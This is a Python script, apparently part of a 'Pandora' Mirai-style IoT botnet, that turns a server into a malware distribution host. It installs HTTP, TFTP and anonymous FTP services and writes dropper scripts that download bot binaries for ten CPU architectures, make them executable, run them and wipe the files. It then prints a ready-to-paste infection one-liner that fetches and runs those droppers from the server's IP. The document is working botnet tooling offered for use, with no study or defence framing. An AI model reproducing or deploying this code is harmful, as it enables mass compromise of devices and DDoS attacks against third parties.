#building a payload guysssssss
# pandora was once private but now public

print("\x1b[1;37m Creating \x1b[1;36mPayload \x1b[1;37mfor \x1b[1;36mPandora's \x1b[1;37mBox\x1b[0m")


import subprocess, sys, urllib
ip = urllib.urlopen('http://api.ipify.org').read()
exec_bin = "awoo"
exec_name = "OPI"
bin_prefix = "pandora."
bin_directory = "Pandoras_Box"
archs = ["x86",               #1
"mips",                       #2
"mpsl",                       #3
"arm4",                       #4
"arm5",                       #5
"arm6",                       #6
"arm7",                       #7
"ppc",                        #8
"m68k",                       #9
"sh4"]                        #10
def run(cmd):
    subprocess.call(cmd, shell=True)
print("\033[01;36m pandora is totally private now guys...")
print(" ")
run("yum install httpd -y &> /dev/null")
run("service httpd start &> /dev/null")
run("yum install xinetd tftp tftp-server -y &> /dev/null")
run("yum install vsftpd -y &> /dev/null")
run("service vsftpd start &> /dev/null")
run('''echo "service tftp
{
	socket_type             = dgram
	protocol                = udp
	wait                    = yes
    user                    = root
    server                  = /usr/sbin/in.tftpd
    server_args             = -s -c /var/lib/tftpboot
    disable                 = no
    per_source              = 11
    cps                     = 100 2
    flags                   = IPv4
}
" > /etc/xinetd.d/tftp''')	
run("service xinetd start &> /dev/null")
run('''echo "listen=YES
local_enable=NO
anonymous_enable=YES
write_enable=NO
anon_root=/var/ftp
anon_max_rate=2048000
xferlog_enable=YES
listen_address='''+ ip +'''
listen_port=21" > /etc/vsftpd/vsftpd-anon.conf''')
run("service vsftpd restart &> /dev/null")
run("service xinetd restart &> /dev/null")
print("\033[1;37m Creating \x1b[1;36mYour \x1b[1;37mBins")
print(" ")
run('echo "#!/bin/bash" > /var/lib/tftpboot/Pandora.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pandora.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pandora.sh')
run('echo "#!/bin/bash" > /var/lib/tftpboot/Pandora2.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pandora2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pandora2.sh')
run('echo "#!/bin/bash" > /var/www/html/Pandora.sh')
run('echo "ulimit -n 1024" >> /var/lib/tftpboot/Pandora2.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/lib/tftpboot/Pandora2.sh')
run('echo "#!/bin/bash" > /var/ftp/Pandora1.sh')
run('echo "ulimit -n 1024" >> /var/ftp/Pandora1.sh')
run('echo "cp /bin/busybox /tmp/" >> /var/ftp/Pandora1.sh')
for i in archs:
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+'; curl -O http://' + ip + '/'+bin_directory+'/'+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/www/html/Pandora.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; ftpget -v -u anonymous -p anonymous -P 21 ' + ip + ' '+bin_prefix+i+' '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/ftp/Pandora1.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp ' + ip + ' -c get '+bin_prefix+i+';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Pandora.sh')
    run('echo "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; tftp -r '+bin_prefix+i+' -g ' + ip + ';cat '+bin_prefix+i+' >'+exec_bin+';chmod +x *;./'+exec_bin+'" >> /var/lib/tftpboot/Pandora2.sh')    
run("service xinetd restart &> /dev/null")
run("service httpd restart &> /dev/null")
run('echo -e "ulimit -n 99999" >> ~/.bashrc')
print("\x1b[1;36mPayload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://" + ip + "/Pandora.sh; curl -O http://" + ip + "/Pandora.sh; chmod 777 Pandora.sh; sh Pandora.sh; tftp " + ip + " -c get Pandora.sh; chmod 777 Pandora.sh; sh Pandora.sh; tftp -r Pandora2.sh -g " + ip + "; chmod 777 Pandora2.sh; sh Pandora2.sh; ftpget -v -u anonymous -p anonymous -P 21 " + ip + " Pandora1.sh Pandora1.sh; sh Pandora1.sh; rm -rf Pandora.sh Pandora.sh Pandora2.sh Pandora1.sh; rm -rf *\x1b[0m")
print("")
raw_input("\033[01;37mThere's \x1b[1;36mYour \x1b[1;37mPayload :)\033[0m")
